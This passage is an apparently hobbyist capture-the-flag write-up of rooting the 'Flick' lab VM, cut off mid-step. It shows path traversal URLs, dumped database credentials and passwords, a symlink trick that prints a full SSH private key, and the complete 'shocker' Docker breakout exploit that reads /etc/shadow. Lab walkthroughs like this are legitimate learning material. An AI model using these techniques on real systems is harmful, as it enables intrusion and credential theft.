<p><img src="http://media.tumblr.com/tumblr_lg3vooHJ7B1qac925.gif" alt="" /></p>

<p>Firstly I needed to find out the DocumentRoot from the Apache</p>

<p>So, I figured I wanted some credentials - and started by trying to get MySQL credentials from the application. A bit of googling determined that the application was <a href="http://getbootstrap.com/">Bootstrap</a> on top of <a href="https://github.com/laravel/laravel">Laravel</a>.  Firstly I requested the following URL to get the apache configuration.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
<a href="http://192.168.0.106/image/download?filename=....//....//....//....//....//etc/apache2/apache.conf">http://192.168.0.106/image/download?filename=&#8230;.//&#8230;.//&#8230;.//&#8230;.//&#8230;.//etc/apache2/apache.conf</a>
[/plain]</p>

<p>which pointed me towards the sites-enabled folder. A bit of googling told me that sites-enabled is just full of symlinks to files in sites-available, so I grabbed the default file</p>

<p>[plain gutter=&ldquo;false&rdquo;]
<a href="http://192.168.0.106/image/download?filename=....//....//....//....//....//etc/apache2/sites-available/default">http://192.168.0.106/image/download?filename=&#8230;.//&#8230;.//&#8230;.//&#8230;.//&#8230;.//etc/apache2/sites-available/default</a>[/plain]</p>

<p>[plain]
<VirtualHost *:80>
    ServerAdmin webmaster@localhost</p>

<pre><code>DocumentRoot /var/www/flick_photos/public
&lt;Directory /&gt;
    Options FollowSymLinks
    AllowOverride None
&lt;/Directory&gt;
&lt;Directory /var/www/flick_photos/public&gt;
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Order allow,deny
    allow from all
&lt;/Directory&gt;

ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
&lt;Directory "/usr/lib/cgi-bin"&gt;
    AllowOverride None
    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
    Order allow,deny
    Allow from all
&lt;/Directory&gt;

ErrorLog ${APACHE_LOG_DIR}/error.log

# Possible values include: debug, info, notice, warn, error, crit,
# alert, emerg.
LogLevel warn

CustomLog ${APACHE_LOG_DIR}/access.log combined

Alias /doc/ "/usr/share/doc/"
&lt;Directory "/usr/share/doc/"&gt;
    Options Indexes MultiViews FollowSymLinks
    AllowOverride None
    Order deny,allow
    Deny from all
    Allow from 127.0.0.0/255.0.0.0 ::1/128
&lt;/Directory&gt;
</code></pre>

<p></VirtualHost>
[/plain]</p>

<p>Our DocumentRoot is /var/www/flick_photos/public, so we now know our base path. Using the Laravel github repo as a directional aid, I found out the database config file is located in app/config/database.php, so</p>

<p>[plain gutter=&ldquo;false&rdquo;]
<a href="http://192.168.0.106/image/download?filename=....//....//....//....//....//var/www/flick_photos/app/config/database.php">http://192.168.0.106/image/download?filename=&#8230;.//&#8230;.//&#8230;.//&#8230;.//&#8230;.//var/www/flick_photos/app/config/database.php</a>
[/plain]</p>

<p>catting this image.jpg file does indeed show us credentials for MySQL, but there&rsquo;s something more interesting</p>

<p>[php]
&lt;?php</p>

<p>return array(</p>

<pre><code>/*
|--------------------------------------------------------------------------
| PDO Fetch Style
|--------------------------------------------------------------------------
|
| By default, database results will be returned as instances of the PHP
| stdClass object; however, you may desire to retrieve records in an
| array format for simplicity. Here you can tweak the fetch style.
|
*/

'fetch' =&gt; PDO::FETCH_CLASS,

/*
|--------------------------------------------------------------------------
| Default Database Connection Name
|--------------------------------------------------------------------------
|
| Here you may specify which of the database connections below you wish
| to use as your default connection for all database work. Of course
| you may use many connections at once using the Database library.
|
*/

// Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved
// on to the new and improved MySQL database. So, I will just comment out this as it is
// no longer in use

//'default' =&gt; 'sqlite',
'default' =&gt; 'mysql',

/*
|--------------------------------------------------------------------------
| Database Connections
|--------------------------------------------------------------------------
|
| Here are each of the database connections setup for your application.
| Of course, examples of configuring each database platform that is
| supported by Laravel is shown below to make development simple.
|
|
| All database work in Laravel is done through the PHP PDO facilities
| so make sure you have the driver for your particular database of
| choice installed on your machine before you begin development.
|
*/

'connections' =&gt; array(

    'sqlite' =&gt; array(
        'driver'   =&gt; 'sqlite',
        'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
        'prefix'   =&gt; '',
    ),

    'mysql' =&gt; array(
        'driver'    =&gt; 'mysql',
        'host'      =&gt; 'localhost',
        'database'  =&gt; 'flick',
        'username'  =&gt; 'flick',
        'password'  =&gt; 'resuddecNeydmar3',
        'charset'   =&gt; 'utf8',
        'collation' =&gt; 'utf8_unicode_ci',
        'prefix'    =&gt; '',
    ),

    'pgsql' =&gt; array(
        'driver'   =&gt; 'pgsql',
        'host'     =&gt; 'localhost',
        'database' =&gt; 'forge',
        'username' =&gt; 'forge',
        'password' =&gt; '',
        'charset'  =&gt; 'utf8',
        'prefix'   =&gt; '',
        'schema'   =&gt; 'public',
    ),

    'sqlsrv' =&gt; array(
        'driver'   =&gt; 'sqlsrv',
        'host'     =&gt; 'localhost',
        'database' =&gt; 'database',
        'username' =&gt; 'root',
        'password' =&gt; '',
        'prefix'   =&gt; '',
    ),

),

/*
|--------------------------------------------------------------------------
| Migration Repository Table
|--------------------------------------------------------------------------
|
| This table keeps track of all the migrations that have already run for
| your application. Using this information, we can determine which of
| the migrations on disk haven't actually been run in the database.
|
*/

'migrations' =&gt; 'migrations',

/*
|--------------------------------------------------------------------------
| Redis Databases
|--------------------------------------------------------------------------
|
| Redis is an open source, fast, and advanced key-value store that also
| provides a richer set of commands than a typical key-value systems
| such as APC or Memcached. Laravel makes it easy to dig right in.
|
*/

'redis' =&gt; array(

    'cluster' =&gt; false,

    'default' =&gt; array(
        'host'     =&gt; '127.0.0.1',
        'port'     =&gt; 6379,
        'database' =&gt; 0,
    ),

),
</code></pre>

<p>);
[/php]</p>

<p>This line is what we need to be focusing on</p>

<p>[php]database&#8217; => <strong>DIR</strong>.&lsquo;/../database/production.sqlite&rsquo;, // OLD DATABASE NO LONGER IN USE![/php]</p>

<p>which would indicate that the app previously used SQLite, and switched to MySQL. There&rsquo;s a file I need to get my hands on !</p>

<p>[plain gutter=&ldquo;false&rdquo;]<a href="http://192.168.0.106/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite">http://192.168.0.106/image/download?filename=&#8230;.//&#8230;.//&#8230;.//&#8230;.//var/www/flick_photos/app/database/production.sqlite</a>
[/plain]</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_004.png" alt="flick_004" /></a></p>

<p>Yes !  Once I renamed the file and installed SQLite tools onto my Kali VM, I was able to wander around the database to get some username and password combos</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# mv image.jpg production.sqlite
root@pwk:~# apt-get install sqlite
Blah blah, install blah.
root@pwk:~# sqlite production.sqlite
SQLite version 2.8.17
Enter &ldquo;.help&rdquo; for instructions
sqlite> .databases
seq  name             file</p>

<hr />

<p>0    main             /root/Downloads/production.sqlite
1    temp             /var/tmp/sqlite_pUdaqDiGqjXzPPF
sqlite> .tables
old_users
sqlite> .dump old_users
BEGIN TRANSACTION;
CREATE TABLE old_users (
  username text,
  password text
);
INSERT INTO old_users VALUES(&lsquo;paul&rsquo;,&lsquo;nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi&rsquo;);
INSERT INTO old_users VALUES(&lsquo;robin&rsquo;,&lsquo;JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1&rsquo;);
INSERT INTO old_users VALUES(&lsquo;james&rsquo;,&lsquo;scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5&rsquo;);
INSERT INTO old_users VALUES(&lsquo;dean&rsquo;,&lsquo;FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA&rsquo;);
COMMIT;
sqlite>
[/plain]</p>

<p>I know that the users Robin and Dean exist, so I decided to try the above passwords</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x72;&#111;&#98;&#105;&#110;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#48;&#46;&#x31;&#48;&#54;">&#x72;&#x6f;&#98;&#105;&#x6e;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#46;&#49;&#x30;&#x36;</a></p>

<p> .o88o. oooo   o8o            oooo
 888 <code>"</code>888   <code>"'           </code>888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  <code>888  d88'</code>&ldquo;Y8  888 .8P&#8217;
 888     888   888  888        888888.
 888     888   888  888   .o8  888 <code>88b.
o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>

<p><a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x72;&#x6f;&#x62;&#x69;&#x6e;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x30;&#x2e;&#49;&#48;&#x36;">&#x72;&#111;&#x62;&#105;&#110;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#48;&#x2e;&#x31;&#48;&#54;</a>&rsquo;s password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
Permission denied, please try again.
<a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#114;&#111;&#x62;&#105;&#x6e;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x30;&#46;&#x31;&#x30;&#x36;">&#114;&#x6f;&#98;&#105;&#x6e;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#48;&#46;&#49;&#48;&#x36;</a>&rsquo;s password: ^C
root@pwk:~# ssh <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#100;&#101;&#x61;&#110;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#48;&#46;&#49;&#x30;&#54;">&#x64;&#101;&#x61;&#110;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#48;&#46;&#x31;&#48;&#54;</a></p>

<p> .o88o. oooo   o8o            oooo
 888 <code>"</code>888   <code>"'           </code>888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  <code>888  d88'</code>&ldquo;Y8  888 .8P&#8217;
 888     888   888  888        888888.
 888     888   888  888   .o8  888 <code>88b.
o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>

<p><a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#100;&#101;&#97;&#110;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x30;&#x2e;&#x31;&#x30;&#x36;">&#x64;&#x65;&#x61;&#110;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x30;&#x2e;&#49;&#x30;&#x36;</a>&rsquo;s password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


<p>  System information as of Wed Aug 13 00:18:03 SAST 2014</p>

<p>  System load:  0.0               Processes:              87
  Usage of /:   39.7% of 6.99GB   Users logged in:        0
  Memory usage: 49%               IP address for eth0:    192.168.0.106
  Swap usage:   1%                IP address for docker0: 172.17.42.1</p>

<p>  Graph this data and manage this system at:
    <a href="https://landscape.canonical.com/">https://landscape.canonical.com/</a></p>

<p>79 packages can be updated.
51 updates are security updates.</p>

<p>New release &lsquo;14.04.1 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</p>

<p>Last login: Wed Aug 13 00:16:41 2014 from 192.168.0.110
dean@flick:~$ [/plain]</p>

<p>OK, we&rsquo;re in. Let the fun continue.</p>

<hr />

<h2>Dean Covers While Robin&rsquo;s on Holiday</h2>

<p>Dean&rsquo;s home folder includes two files - a message text file and a binary called read_docker with the SUID bit set as the robin user.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
dean@flick:~$ ls -l
total 16
-rw-r&ndash;r&ndash; 1 root  root  1250 Aug  4 12:56 message.txt
-rwsr-xr-x 1 robin robin 8987 Aug  4 14:45 read_docker
dean@flick:~$ [/plain]</p>

<p>The message file tells us that Robin is away on holiday, and that the admin guys will allow Dean access to his dockerfile in his home directory.</p>

<p>[plain]
&mdash;&ndash;BEGIN PGP SIGNED MESSAGE&mdash;&ndash;
Hash: SHA1</p>

<p>Hi Dean,</p>

<p>I will be away on leave for the next few weeks. I have asked the admin guys to
write a quick script that will allow you to read my .dockerfile for flick-
a-photo so that you can continue working in my absense.</p>

<p>The .dockerfile is in my home, so the path for the script will be something like
/home/robin/flick-dev/</p>

<p>Please call me if you have any troubles!</p>

<hr />

<p>Ciao
Robin
&mdash;&ndash;BEGIN PGP SIGNATURE&mdash;&ndash;
Version: GnuPG v1</p>

<p>iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
nZAuFXkGFu6cMMD4rDXQ
=2moZ
&mdash;&ndash;END PGP SIGNATURE&mdash;&ndash;
[/plain]</p>

<p>Looks like they tried to be clever and made the binary instead. So, what does this binary do ? It seems to just read any file called &ldquo;dockerfile&rdquo; from the directory you provide.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
dean@flick:~$ ./read_docker /home/robin
ERROR: the specified docker file doesn&rsquo;t exist: /home/robin/Dockerfile
Usage is: ./read_docker /path/to/dockerfile
dean@flick:~$ ./read_docker /home/robin/flick-dev</p>

<h1>Flick-a-photo dev env</h1>

<p>RUN apt-get update &amp;&amp; apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli &amp;&amp; apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*</p>

<p>CMD [&ldquo;/usr/sbin/apache2&rdquo;, &ldquo;-D&rdquo;, &ldquo;FOREGROUND&rdquo;]
dean@flick:~$ [/plain]</p>

<p>After messing around reading files I created in varying directories, I decided to fool the application into reading a symlink to an arbitrary file on the filesystem - my first attempt was /home/robin/.ssh/id_rsa. Might as well start somewhere, right ? I was fully expecting this to fail, as I had no idea if the target file actually existed.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
dean@flick:~$ ln -s /home/robin/.ssh/id_rsa /home/dean/Dockerfile
dean@flick:~$ ls -l
total 16
lrwxrwxrwx 1 dean  dean    23 Aug 11 23:10 Dockerfile -> /home/robin/.ssh/id_rsa
-rw-r&ndash;r&ndash; 1 root  root  1250 Aug  4 12:56 message.txt
-rwsr-xr-x 1 robin robin 8987 Aug  4 14:45 read_docker
dean@flick:~$ ./read_docker ./
&mdash;&ndash;BEGIN RSA PRIVATE KEY&mdash;&ndash;
MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
&mdash;&ndash;END RSA PRIVATE KEY&mdash;&ndash;
dean@flick:~$ [/plain]</p>

<p><img src="http://cdn.gifbay.com/2012/10/what_the_hell_just_happened-7962.gif" alt="" /></p>

<p>OK, so, I&rsquo;ll put that into a file then and log in as Robin.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
dean@flick:~$ ./read_docker ./ > robin.priv
dean@flick:~$ chmod 600 ./robin.priv
dean@flick:~$ ssh -i robin.priv <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#114;&#x6f;&#x62;&#x69;&#110;&#64;&#49;&#50;&#x37;&#46;&#48;&#46;&#48;&#x2e;&#x31;">&#114;&#111;&#x62;&#x69;&#x6e;&#64;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#x2e;&#49;</a></p>

<p> .o88o. oooo   o8o            oooo
 888 <code>"</code>888   <code>"'           </code>888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  <code>888  d88'</code>&ldquo;Y8  888 .8P&#8217;
 888     888   888  888        888888.
 888     888   888  888   .o8  888 <code>88b.
o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>

<p>Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


<p>  System information as of Wed Aug 13 00:31:14 SAST 2014</p>

<p>  System load:  0.0               Processes:              91
  Usage of /:   39.7% of 6.99GB   Users logged in:        1
  Memory usage: 51%               IP address for eth0:    192.168.0.106
  Swap usage:   1%                IP address for docker0: 172.17.42.1</p>

<p>  Graph this data and manage this system at:
    <a href="https://landscape.canonical.com/">https://landscape.canonical.com/</a></p>

<p>79 packages can be updated.
51 updates are security updates.</p>

<p>New release &lsquo;14.04.1 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</p>

<p>Last login: Wed Aug 13 00:16:47 2014 from 192.168.0.110
robin@flick:~$ [/plain]</p>

<hr />

<h2>Docker all the Things !</h2>

<p>Robin can sudo /opt/start_apache/restart.sh without a password, as shown by running sudo -l</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ sudo -l
Matching Defaults entries for robin on this host:
    env_reset, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>

<p>User robin may run the following commands on this host:
    (root) NOPASSWD: /opt/start_apache/restart.sh
robin@flick:~$
[/plain]</p>

<p>This shell script seems to restart the Apache servers when run</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ sudo /opt/start_apache/restart.sh
 * Restarting web server apache2                                                                                        apache2: Could not reliably determine the server&rsquo;s fully qualified domain name, using 127.0.1.1 for ServerName
 &hellip; waiting apache2: Could not reliably determine the server&rsquo;s fully qualified domain name, using 127.0.1.1 for ServerName
                                                                                                                 [ OK ]
start_apache-8000: stopped
start_apache-8000: started
robin@flick:~$
[/plain]</p>

<p>The file cannot be viewed, as the permissions prevent it</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ ls -l /opt/start_apache/
total 8
-rwx&mdash;&mdash; 1 root root   79 Aug  4 17:04 restart.sh
-rwx&mdash;&mdash; 1 root root 2285 Aug  4 17:09 start.py
robin@flick:~$
[/plain]</p>

<p>There&rsquo;s got to be another way to read that file to see what it&rsquo;s doing. Further poking around resulted in me finding out that Docker is installed (Docker is quite cool - take a look). However, as with any application, there are vulnerabilities.</p>

<p>The docker version command shows us the server is running version 0.11</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ docker version
Client version: 0.11.0
Client API version: 1.11
Go version (client): go1.2.1
Git commit (client): 15209c3
Server version: 0.11.0
Server API version: 1.11
Git commit (server): 15209c3
Go version (server): go1.2.1
Last stable version: 1.1.2, please update docker
robin@flick:~$
[/plain]</p>

<p>Which, according to <a href="http://blog.docker.com/2014/06/docker-container-breakout-proof-of-concept-exploit/">this site</a>, is vulnerable to a container breakout. The blog indicates that there is PoC code out in the wild - so off I went to find it. Turns out it&rsquo;s <a href="https://github.com/gabrtv/shocker">on github</a>, obviously.</p>

<p>OK, so lets clone the repo to the local machine and have a look at the code</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ git clone <a href="https://github.com/gabrtv/shocker">https://github.com/gabrtv/shocker</a>
Cloning into &lsquo;shocker&rsquo;&hellip;
remote: Counting objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0)
Unpacking objects: 100% (27/27), done.
robin@flick:~$
[/plain]</p>

<p>[c]/<em> shocker: docker PoC VMM-container breakout &copy; 2014 Sebastian Krahmer
 *
 * Demonstrates that any given docker image someone is asking
 * you to run in your docker setup can access ANY file on your host,
 * e.g. dumping hosts /etc/shadow or other sensitive info, compromising
 * security of the host and any other docker VM&rsquo;s on it.
 *
 * docker using container based VMM: Sebarate pid and net namespace,
 * stripped caps and RO bind mounts into container&rsquo;s /. However
 * as its only a bind-mount the fs struct from the task is shared
 * with the host which allows to open files by file handles
 * (open_by_handle_at()). As we thankfully have dac_override and
 * dac_read_search we can do this. The handle is usually a 64bit
 * string with 32bit inodenumber inside (tested with ext4).
 * Inode of / is always 2, so we have a starting point to walk
 * the FS path and brute force the remaining 32bit until we find the
 * desired file (It&rsquo;s probably easier, depending on the fhandle export
 * function used for the FS in question: it could be a parent inode# or
 * the inode generation which can be obtained via an ioctl).
 * [In practise the remaining 32bit are all 0 :]
 *
 * tested with docker 0.11 busybox demo image on a 3.11 kernel:
 *
 * docker run -i busybox sh
 *
 * seems to run any program inside VMM with UID 0 (some caps stripped); if
 * user argument is given, the provided docker image still
 * could contain +s binaries, just as demo busybox image does.
 *
 * PS: You should also seccomp kexec() syscall :)
 * PPS: Might affect other container based compartments too
 *
 * $ cc -Wall -std=c99 -O2 shocker.c -static
 </em>/</p>

<h1>define _GNU_SOURCE</h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;sys/stat.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;errno.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;dirent.h></h1>

<h1>include &lt;stdint.h></h1>

<p>struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};</p>

<p>void die(const char *msg)
{
    perror(msg);
    exit(errno);
}</p>

<p>void dump_handle(const struct my_file_handle <em>h)
{
    fprintf(stderr,&ldquo;[</em>] #=%d, %d, char nh[] = {&rdquo;, h->handle_bytes,
            h->handle_type);
    for (int i = 0; i &lt; h->handle_bytes; ++i) {
        fprintf(stderr,&ldquo;0x%02x&rdquo;, h->f_handle[i]);
        if ((i + 1) % 20 == 0)
            fprintf(stderr,&ldquo;\n&rdquo;);
        if (i &lt; h->handle_bytes - 1)
            fprintf(stderr,&ldquo;, &rdquo;);
    }
    fprintf(stderr,&ldquo;};\n&rdquo;);
}</p>

<p>int find_handle(int bfd, const char <em>path, const struct my_file_handle </em>ih, struct my_file_handle <em>oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
        .handle_bytes = 8,
        .handle_type = 1
    };
    DIR </em>dir = NULL;
    struct dirent *de = NULL;</p>

<pre><code>path = strchr(path, '/');

// recursion stops if path has been resolved
if (!path) {
    memcpy(oh-&gt;f_handle, ih-&gt;f_handle, sizeof(oh-&gt;f_handle));
    oh-&gt;handle_type = 1;
    oh-&gt;handle_bytes = 8;
    return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);

if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) &lt; 0)
    die("[-] open_by_handle_at");

if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");

for (;;) {
    de = readdir(dir);
    if (!de)
        break;
    fprintf(stderr, "[*] Found %s\n", de-&gt;d_name);
    if (strncmp(de-&gt;d_name, path, strlen(de-&gt;d_name)) == 0) {
        fprintf(stderr, "[+] Match: %s ino=%d\n", de-&gt;d_name, (int)de-&gt;d_ino);
        ino = de-&gt;d_ino;
        break;
    }
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");

if (de) {
    for (uint32_t i = 0; i &lt; 0xffffffff; ++i) {
        outh.handle_bytes = 8;
        outh.handle_type = 1;
        memcpy(outh.f_handle, &amp;ino, sizeof(ino));
        memcpy(outh.f_handle + 4, &amp;i, sizeof(i));

        if ((i % (1&lt;&lt;20)) == 0)
            fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de-&gt;d_name, i);
        if (open_by_handle_at(bfd, (struct file_handle *)&amp;outh, 0) &gt; 0) {
            closedir(dir);
            close(fd);
            dump_handle(&amp;outh);
            return find_handle(bfd, path, &amp;outh, oh);
        }
    }
}

closedir(dir);
close(fd);
return 0;
</code></pre>

<p>}</p>

<p>int main()
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };</p>

<pre><code>fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014             [***]\n"
       "[***] The tea from the 90's kicks your sekurity again.     [***]\n"
       "[***] If you have pending sec consulting, I'll happily     [***]\n"
       "[***] forward to my friends who drink secury-tea too!      [***]\n");

// get a FS reference from something mounted in from outside
if ((fd1 = open("/.dockerinit", O_RDONLY)) &lt; 0)
    die("[-] open");

if (find_handle(fd1, "/etc/shadow", &amp;root_h, &amp;h) &lt;= 0)
    die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&amp;h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&amp;h, O_RDONLY)) &lt; 0)
    die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) &lt; 0)
    die("[-] read");

fprintf(stderr, "[!] Win! /etc/shadow output follows:\n%s\n", buf);

close(fd2); close(fd1);

return 0;
</code></pre>

<p>}
[/c]</p>

<p>Looks like it&rsquo;s a simple case of replacing the following line with the file to read</p>

<p>[c]if (find_handle(fd1, &ldquo;/etc/shadow&rdquo;, &amp;root_h, &amp;h) &lt;= 0)[/c]</p>

<p>I thought I could be sneaky here and request /root/flag.txt, so I edited the source code, and compiled it as per the instructions</p>

<p>[plain gutter=&ldquo;false&rdquo;]
